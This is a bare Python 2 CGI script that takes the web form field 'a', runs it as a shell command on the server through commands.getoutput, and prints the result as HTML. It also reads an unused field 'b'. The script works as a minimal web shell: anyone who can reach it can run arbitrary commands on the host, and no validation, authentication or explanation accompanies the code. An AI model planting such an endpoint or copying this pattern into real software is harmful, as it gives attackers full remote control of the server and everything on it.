#!/usr/bin/env python
import cgi
import commands
print "Content-Type:text/html"
print ""
y=""
x=""
webdata=cgi.FieldStorage()
x=webdata.getvalue('a')
y=webdata.getvalue('b')
output=commands.getoutput(x)

print "<pre>"
print output
print "</pre>"
